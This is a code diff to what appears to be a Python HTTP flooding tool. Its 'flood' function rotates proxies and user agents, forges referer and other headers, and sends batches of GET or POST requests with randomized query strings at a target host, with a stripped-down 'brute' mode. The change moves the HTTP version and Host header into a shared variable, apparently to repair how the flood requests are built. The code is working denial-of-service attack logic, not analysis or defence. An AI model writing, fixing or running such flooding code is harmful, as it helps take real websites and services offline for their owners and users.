@@ -235,6 +235,7 @@ def flood(attack_type,host,port,path,x,brute,eve):
     else:
         proxy = random.choice(proxies).strip().split(":")
     useragent = useragents[x] + "\r\n"
+    http_ver_host = " HTTP/1.1\r\nHost: "+host+"\r\n"
     connection = "Connection: Keep-Alive:823\r\n"
     accept = "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\r\n"
     referer = "Referer: http://netsec-reborn.onion/ebola-virus?id="+host+"\r\n"
@@ -262,12 +263,12 @@ def flood(attack_type,host,port,path,x,brute,eve):
             try:
                 for _ in range(100):
                     http = attack_type+" "+path+"?"+random.choice(string)+"="+str(random.randint(880906,19990906))
-                    http2 = "&"+random.choice(string)+"?="+str(random.randint(880906,19990906))+" HTTP/1.1\r\nHost: "+host+"\r\n"
+                    http2 = "&"+random.choice(string)+"?="+str(random.randint(880906,19990906))
                     if attack_type == "POST":
                         http = attack_type + " / HTTP/1.1\r\nHost: " + host + "\r\n"
-                    request = http + http2 + useragent + connection + accept + referer + origin + fake_addr + content + length
+                    request = http + http2 + http_ver_host +  useragent + connection + accept + referer + origin + fake_addr + content + length
                     if brute =="ON":
-                        request = http + http2 + connection + content + length
+                        request = http + http_ver_host + connection + content + length
                     s.send(
                         str(request).encode()
                     )
